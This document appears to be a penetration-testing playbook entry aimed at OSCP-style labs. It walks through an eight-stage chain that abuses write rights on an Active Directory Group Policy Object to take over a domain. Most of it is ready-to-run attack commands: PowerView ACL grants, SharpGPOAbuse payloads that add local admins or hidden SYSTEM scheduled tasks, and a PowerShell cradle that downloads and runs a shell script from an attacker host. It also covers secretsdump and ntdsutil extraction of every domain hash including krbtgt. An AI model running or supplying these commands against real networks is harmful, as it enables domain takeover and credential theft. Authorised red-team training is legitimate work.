title: GPO Abuse — WriteDacl/GenericAll/GenericWrite on a Group Policy Object
body:
BloodHound shows you have WriteDacl, GenericAll, GenericWrite, or WriteOwner on a Group Policy Object. This is one of the highest-value AD attack paths because GPOs apply to every machine they're linked to — including domain controllers when the GPO is linked at the domain level (Default Domain Policy, Default Domain Controllers Policy).

The attack: modify the GPO to push a payload that runs as SYSTEM on every machine the GPO applies to. The cleanest payload is adding your user to local Administrators — once GPO applies on the DC, you reconnect via WinRM/SMB and you're effectively domain admin equivalent on the DC.

Key idea: a GPO is two things — an LDAP object (the security descriptor controlled by ACLs) and a folder of files in SYSVOL (the actual policy). WriteDacl lets you modify the LDAP object's ACL. GenericWrite lets you modify the SYSVOL files directly. SharpGPOAbuse handles both layers: it writes the new policy files AND increments the GPT.ini version number so clients pick up the change on next refresh.

— THE EIGHT-STAGE CHAIN —

  1. CONFIRM PATH IN BLOODHOUND
     Mark your user as Owned, run 'Shortest Path from Owned'.
     Look for edges: WriteDacl, GenericAll, GenericWrite, WriteOwner on a GPO node.
     Trace what the GPO is linked to (GPLink edges):
       - Linked to Domain → applies to ALL computers (including DC)
       - Linked to OU → applies to that OU only
       - Linked to Domain Controllers OU → SYSTEM on DC
       - No GPLink (orphan) → applying changes does nothing, find another GPO

  2. VERIFY YOUR EDGE WITH POWERVIEW (DON'T SKIP THIS)
     BloodHound data can be stale. Confirm the live ACL on target.
     Run Get-GPPermission with your username and the GPO GUID.
     Expected: Permission = GpoEditDeleteModifySecurity (or GpoEdit).
     If empty/nothing: BloodHound is stale, recollect or pivot.

  3. CONVERT THE EDGE INTO USABLE RIGHTS (if needed)
     If you have GpoEditDeleteModifySecurity → skip to step 4.
     If you have WriteDacl only → grant yourself GenericAll (Add-DomainObjectAcl).
     If you have WriteOwner → take ownership first, then grant rights.

  4. MODIFY THE GPO
     SharpGPOAbuse from a foothold shell, or pygpoabuse from Kali.
     Pick payload: AddLocalAdmin (cleanest), AddComputerTask (immediate exec),
     or AddUserRights (granular privilege grant).

  5. WAIT FOR REFRESH OR FORCE IT
     Default GPO refresh: 90 minutes ± 0-30 min random offset.
     Force locally with gpupdate /force.
     Force remotely via Invoke-Command if you have CanPSRemote on the DC.

  6. VERIFY THE GPO LANDED (FROM KALI, NOT FROM YOUR SHELL)
     Existing shell sessions cache OLD tokens — they will lie to you.
     Use nxc smb $ip -u user -p pass — look for (Pwn3d!) marker.
     This is authoritative because each nxc call is a fresh authentication.

  7. RECONNECT WITH FRESH AUTHENTICATION FOR THE LOOT
     Drop your existing shell. Reconnect from scratch (evil-winrm/psexec/sliver).
     New auth = new token = new privileges visible.
     Grab proof.txt, dump domain hashes, etc.

  8. CLEANUP — ALWAYS DOCUMENT FOR THE REPORT
     Remove yourself from local Administrators.
     Revert the GPO changes (or note them so the client can revert).
     Note original versionNumber in GPT.ini before/after.

— PAYLOAD OPTIONS — PICK BASED ON CONTEXT —

  PAYLOAD A: AddLocalAdmin
    Adds your user to local Administrators on every computer the GPO applies to.
    Best when: you want stable, interactive access (WinRM, RDP, psexec).
    Wait time: until next GPO refresh on target machine.
    Visibility: low — just a member of a local group.
    Cleanup: remove from local Administrators after.

  PAYLOAD B: AddComputerTask (scheduled task running as SYSTEM)
    Creates an immediate scheduled task that runs your command as SYSTEM.
    Best when: you want immediate code execution, not interactive shell.
    Wait time: task fires shortly after GPO applies.
    Visibility: higher — scheduled task is logged in event log.
    Cleanup: must remove the task definition from GPO files.

  PAYLOAD C: AddUserRights (privilege grants)
    Grants user rights like SeDebugPrivilege or SeImpersonatePrivilege.
    Best when: stealth, only need a specific privilege for a known exploit chain.
    Wait time: until next GPO refresh.
    Visibility: lowest — appears as policy assignment.

— GPLINK SCOPE MATTERS —

  Default Domain Policy (linked to domain root):
    Affects EVERY computer in the domain including the DC.
    Modifying this is scorched-earth on a real engagement.
    On lab boxes, fine — revert after.

  Default Domain Controllers Policy (linked to Domain Controllers OU):
    Affects only DCs. Most direct path to DC compromise.
    Less collateral damage than modifying domain root.

  Custom GPO linked to a workstation OU:
    Lateral movement vector — compromises workstations, not DC.
    Use to harvest more credentials, then chain forward.

  Orphan GPO (no GPLink):
    Modifying it does nothing. Don't waste time.
cmd:
# ── STEP 1: CONFIRM PATH IN BLOODHOUND ───────────────
# In BloodHound GUI:
#   1. Right-click your user → Mark User as Owned
#   2. Pre-built query: 'Shortest Path from Owned'
#   3. Look for edges: WriteDacl/GenericAll/GenericWrite/WriteOwner → GPO
#   4. Note the GPO name AND what it's linked to (GPLink edge)
#
# Cypher console verification:
# MATCH p=(u:User {owned:true})-[r:GenericAll|GenericWrite|WriteDacl|WriteOwner]->(g:GPO) RETURN p

# ── STEP 2: VERIFY YOUR ACCESS WITH POWERVIEW ────────
# Load PowerView in your foothold session (evil-winrm or sliver shell)
. .\PowerView.ps1

# Enumerate GPOs to confirm/find the GUID
Get-NetGPO | Select displayname,name
# Or filter to a specific one:
Get-NetGPO -Identity "Default Domain Policy" | Select displayname,name,gpcfilesyspath,versionnumber

# Confirm YOUR permission on the target GPO (replace GUID + username)
Get-GPPermission -Guid 31B2F340-016D-11D2-945F-00C04FB984F9 -TargetType User -TargetName anirudh
# Expected output:
#   Trustee     : anirudh
#   TrusteeType : User
#   Permission  : GpoEditDeleteModifySecurity
#   Inherited   : False
#
# If Permission shows GpoEdit or GpoEditDeleteModifySecurity → proceed to step 4.
# If empty/nothing → BloodHound data is stale, recollect:
#   bloodhound-python -d domain.local -u user -p pass -ns $ip -c All

# ── STEP 3A: WRITEDACL → GRANT YOURSELF GENERICALL ───
# Only needed if you have WriteDacl but not GpoEdit yet
# Build credential object in CURRENT PowerShell session (see warn block on $Cred)
$SecPassword = ConvertTo-SecureString 'SecureHM' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('VAULT\anirudh', $SecPassword)

# Grant yourself full control over the GPO
Add-DomainObjectAcl -Credential $Cred `
  -TargetIdentity "Default Domain Policy" `
  -PrincipalIdentity anirudh `
  -Rights All

# Verify the new ACE
Get-DomainObjectAcl -Identity "Default Domain Policy" -Credential $Cred -ResolveGUIDs | `
  Where-Object { $_.SecurityIdentifier -match (Get-DomainUser anirudh).objectsid }

# ── STEP 3B: WRITEOWNER → TAKE OWNERSHIP FIRST ───────
Set-DomainObjectOwner -Identity "Default Domain Policy" -OwnerIdentity anirudh -Credential $Cred
# Then grant yourself GenericAll (same as 3A)

# ── STEP 4: SHARPGPOABUSE — THE MAIN EVENT ───────────
# Download SharpGPOAbuse precompiled — match .NET to Windows version:
#   Server 2008R2/2012 →   NetFramework_4.0_x64 (most compatible)
#   Server 2016/2019/2022 → NetFramework_4.7_x64
#   If unsure: try 4.0 first, fall back to 4.7
wget https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.0_x64/SharpGPOAbuse.exe

# Transfer to target via SMB or evil-winrm upload, then on target shell:
upload SharpGPOAbuse.exe

# ─ NOTE on PowerShell vs cmd execution ─
# In PowerShell you MUST prefix with .\ to run from current dir:
#   .\SharpGPOAbuse.exe   ✓ works
#   SharpGPOAbuse.exe     ✗ command not found
# In cmd shell either form works. From a Sliver shell you may bounce through
# both — if you get 'not recognized' in PowerShell, add the .\ prefix.

# PAYLOAD A: Add local admin (RECOMMENDED for most cases)
.\SharpGPOAbuse.exe --AddLocalAdmin `
  --UserAccount anirudh `
  --GPOName "Default Domain Policy"
# Expected output:
#   [+] Domain = vault.offsec
#   [+] Domain Controller = DC.vault.offsec
#   [+] SID Value of anirudh = S-1-5-21-...
#   [+] versionNumber attribute changed successfully
#   [+] The version number in GPT.ini was increased successfully.
#   [+] The GPO was modified to include a new local admin. Wait for the GPO refresh cycle.
#   [+] Done!

# PAYLOAD B: Immediate scheduled task as SYSTEM
# Generate base64-encoded PowerShell rev shell first:
#   $cmd = 'IEX(New-Object Net.WebClient).DownloadString("http://LHOST/shell.ps1")'
#   $b64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
.\SharpGPOAbuse.exe --AddComputerTask `
  --TaskName "Updater" `
  --Author "NT AUTHORITY\SYSTEM" `
  --Command "cmd.exe" `
  --Arguments "/c powershell -nop -w hidden -enc <BASE64>" `
  --GPOName "Default Domain Policy"

# PAYLOAD C: Grant user rights
.\SharpGPOAbuse.exe --AddUserRights `
  --UserRights SeDebugPrivilege,SeImpersonatePrivilege `
  --UserAccount anirudh `
  --GPOName "Default Domain Policy"

# ── ALTERNATIVE: PYGPOABUSE FROM KALI ────────────────
# When you can't or don't want to run a binary on target
# git clone https://github.com/Hackndo/pyGPOAbuse
python3 pygpoabuse.py VAULT.OFFSEC/anirudh:'SecureHM' \
  -gpo-id '31B2F340-016D-11D2-945F-00C04FB984F9' \
  --powershell --command 'powershell -nop -w hidden -enc <BASE64>'

# ── STEP 5: FORCE OR WAIT FOR GPO REFRESH ────────────
# Default refresh: 90 min + random 0-30 min offset
# On lab boxes this is usually 5-15 min; sometimes faster

# Force locally if you're already on the target:
gpupdate /force

# Force remotely if you have CanPSRemote on the DC:
Invoke-Command -ComputerName DC.VAULT.OFFSEC `
  -ScriptBlock { gpupdate /force } `
  -Credential $Cred
#
# IMPORTANT: $Cred MUST exist in the SAME PowerShell session you run
# Invoke-Command in. Variables don't survive shell transitions:
#   PS → cmd → PS         = $Cred is gone, rebuild it
#   evil-winrm reconnect  = $Cred is gone, rebuild it
#   Sliver shell respawn  = $Cred is gone, rebuild it
# If you see 'Cannot process argument transformation on parameter Credential.
# Access is denied' — your $Cred is empty. Rebuild it (step 3A lines).
#
# If WinRM double-hop fails ('specified logon session does not exist') —
# Kerberos delegation isn't configured. Just run gpupdate locally if you
# have a shell on target, or wait for natural refresh.

# ── STEP 6: VERIFY FROM KALI (AUTHORITATIVE) ─────────
# Don't trust your existing shell — its token is cached. Verify from Kali
# with nxc — each call is fresh auth, no token caching.
nxc smb $ip -u anirudh -p 'SecureHM'
# Look for the (Pwn3d!) marker:
#   SMB    192.168.45.201    445   DC    [+] vault.offsec\anirudh:SecureHM (Pwn3d!)
# That marker = anirudh has admin access. GPO landed.

# Polling loop while you wait:
while true; do
  sleep 60
  result=$(nxc smb $ip -u anirudh -p 'SecureHM' 2>&1)
  echo "$(date): $result"
  if echo "$result" | grep -q 'Pwn3d'; then echo 'GPO APPLIED'; break; fi
done

# ── STEP 7: RECONNECT FOR LOOT — DO NOT SKIP ─────────
# Existing sessions have cached tokens with OLD group memberships.
# whoami /priv in your current shell shows OLD privileges.
# This is by design — Windows access tokens are issued at logon.
#
# To see the new privileges YOU MUST RECONNECT:
exit              # close existing evil-winrm/sliver session entirely

# Reconnect from Kali — triggers fresh auth = new token = new privs:
evil-winrm -i $ip -u anirudh -p 'SecureHM'
# Or skip straight to SYSTEM:
impacket-psexec vault.offsec/anirudh:'SecureHM'@$ip

# Now verify privileges:
whoami /priv
# Should show full admin priv set: SeDebugPrivilege, SeImpersonatePrivilege,
# SeTcbPrivilege, SeBackupPrivilege, SeAssignPrimaryTokenPrivilege,
# SeLoadDriverPrivilege, etc.

net localgroup Administrators
# Should show your username listed

# Collect proof.txt
type C:\Users\Administrator\Desktop\proof.txt

# Full domain takeover — one command:
impacket-secretsdump -just-dc-ntlm vault.offsec/anirudh:'SecureHM'@$ip
# Outputs every domain user NT hash + krbtgt (for golden ticket)

# Or full NTDS dump from inside an admin session:
ntdsutil.exe "ac i ntds" "ifm" "create full C:\\Windows\\Temp\\ntds" q q

# ── STEP 8: CLEANUP — DOCUMENT EVERYTHING ────────────
# Remove yourself from local admins (if used Payload A):
net localgroup administrators anirudh /delete

# Remove the ACL grant you added (if used Add-DomainObjectAcl):
Remove-DomainObjectAcl -Credential $Cred `
  -TargetIdentity "Default Domain Policy" `
  -PrincipalIdentity anirudh `
  -Rights All

# Remove scheduled task from GPO (if used Payload B):
# Edit GPO XML in SYSVOL or use Group Policy Management Console.
# Note: SharpGPOAbuse modifies these files in SYSVOL:
#   \\domain\SysVol\domain\Policies\{GUID}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
#   \\domain\SysVol\domain\Policies\{GUID}\GPT.ini  (versionNumber)
# Reverting means restoring those files to original state.
warn:
TOKEN CACHING IS THE #1 CONFUSION POINT — READ THIS FIRST:
  After SharpGPOAbuse + gpupdate, your EXISTING shell session keeps the OLD
  access token. whoami /priv will show OLD privileges even though the GPO
  applied successfully. This is not a failure — it's how Windows access tokens
  work. They're issued at logon time and don't refresh on group changes.
  
  Symptom: SharpGPOAbuse says 'Done!', gpupdate says 'completed successfully',
  but whoami /priv still shows your basic user privs. You will think the
  attack failed. It didn't.
  
  Fix: drop the existing session entirely (exit) and reconnect. Fresh
  authentication pulls current group memberships and issues a new token.
  THEN whoami /priv shows the admin priv set.
  
  Authoritative verification from Kali (no token caching issue):
    nxc smb $ip -u user -p pass
  Look for (Pwn3d!) marker — that proves the GPO landed regardless of
  what your existing shell tells you.

VARIABLES DO NOT SURVIVE SHELL TRANSITIONS:
  $Cred set in PowerShell is gone after:
    - cmd /c <something>      (subprocess inherits env vars but not PS variables)
    - cmd → powershell        (new PS process, fresh state)
    - exit and reconnect      (entirely new session)
    - Sliver shell respawn    (new PID, new session)
  If Invoke-Command throws 'Cannot process argument transformation on
  parameter Credential. Access is denied' — your $Cred is empty.
  Rebuild it in your CURRENT shell:
    $SecPassword = ConvertTo-SecureString 'pass' -AsPlainText -Force
    $Cred = New-Object PSCredential('DOMAIN\user', $SecPassword)
  Then re-run Invoke-Command.

MODIFYING DEFAULT DOMAIN POLICY ON A REAL ENGAGEMENT IS SCORCHED EARTH:
  This GPO applies to every computer in the domain. Adding a scheduled task
  or local admin entry hits everything. On a real engagement:
    - Get explicit client approval before modifying domain-linked GPOs
    - Note the original GPO versionNumber in GPT.ini before changes
    - Document every modification for the report
    - Plan removal of your changes immediately after exploitation
  On OSCP/HTB lab boxes: revert when done. No real consequence.

GPO REFRESH IS NOT INSTANT:
  Default = 90 min + 0-30 min random offset. Don't panic if it doesn't fire
  immediately. Force with gpupdate /force where possible. On lab boxes,
  worst case wait ~15-20 min if you can't force refresh.

DEFAULT DOMAIN POLICY vs DEFAULT DOMAIN CONTROLLERS POLICY:
  Both are linked at high scope and both work for DC compromise.
  Default Domain Controllers Policy is more targeted (DCs only, less
  collateral) but ACL on Default Domain Policy is more commonly
  misconfigured. BloodHound shows you which one you actually have rights on.

WINRM DOUBLE-HOP FAILURE:
  If Invoke-Command fails with 'WinRM cannot process the request. The
  following error with errorcode 0x8009030e occurred while using Kerberos
  authentication: A specified logon session does not exist' — that's the
  Kerberos double-hop limitation. WinRM session A can't forward credentials
  to remote machine B unless delegation is configured. Workarounds:
    - Run gpupdate locally on target instead of remotely
    - Use CredSSP authentication (rarely available)
    - Just wait for natural refresh

SHARPGPOABUSE NEEDS .NET ON TARGET:
  Most precompiled builds work on Server 2012+ / Windows 7+.
  Use NetFramework_4.0_x64 build for Server 2008R2/2012 targets.
  Use NetFramework_4.7_x64 for Server 2016+.
  If unsure: try 4.0 first (more compatible), fall back to 4.7 if it fails.

PYGPOABUSE COMPATIBILITY:
  pygpoabuse needs the GPO GUID, not just the name. Get it from BloodHound
  (right-click GPO → Properties → Object ID) or via PowerView:
    Get-DomainGPO -Identity 'Default Domain Policy' | Select Name,GPCFileSysPath

WHEN GPO ABUSE FAILS:
  - Confirm GPO actually has GPLink to something (orphan GPOs do nothing)
  - Confirm target machine is under the OU/scope the GPO applies to
  - Check Resultant Set of Policy on target: gpresult /h report.html
  - SYSVOL replication can lag — wait 5 min and try again on a different DC
  - AppLocker or WDAC may block scheduled task — use AddLocalAdmin instead
  - Verify GPT.ini versionNumber actually incremented (SharpGPOAbuse output)

choices.label: GPO applied — reconnect for fresh token
Got admin shell — psexec to SYSTEM
Got admin — dump domain hashes (krbtgt etc)
Got admin hashes — pass the hash to other hosts
GPO not applying — troubleshoot or try ACL abuse
Back to BloodHound for another path
